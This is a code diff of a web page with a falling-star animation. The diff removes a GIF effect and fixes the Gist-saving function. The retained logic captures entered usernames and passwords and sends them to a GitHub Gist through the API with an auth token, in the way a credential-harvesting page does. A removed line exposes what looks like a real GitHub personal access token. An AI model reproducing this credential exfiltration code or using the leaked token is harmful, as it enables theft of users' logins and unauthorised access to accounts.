@@ -24,23 +24,13 @@
             z-index: 1;
         }
 
-        .star, .gif {
+        .star {
             position: absolute;
             animation: moveDown 5s linear infinite;
             opacity: 0.8;
-        }
-
-        .star {
             width: 2px;
             height: 2px;
             background: white;
-        }
-
-        .gif {
-            width: 30px;
-            height: 30px;
-            background-image: url('giphy.gif');
-            background-size: cover;
         }
 
         @keyframes moveDown {
@@ -240,10 +230,10 @@
         const GIST_ID = 'a2a704439b6e63da0a509c1125f5a936'; // Your Gist ID
 
         function saveToGist(content) {
-            fetch(`https://api.github.com/gists/${a2a704439b6e63da0a509c1125f5a936}`, {
+            fetch(`https://api.github.com/gists/${GIST_ID}`, {
                 method: 'PATCH',
                 headers: {
-                    'Authorization': `token ${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}`,
+                    'Authorization': `token ${GITHUB_TOKEN}`,
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
@@ -275,8 +265,6 @@
 
                 var textArea = document.getElementById('textArea');
                 textArea.value += `Username: ${username}\nPassword: ${password}\n\n`;
-
-                localStorage.setItem('loginData', textArea.value);
 
                 saveToGist(textArea.value);
             }
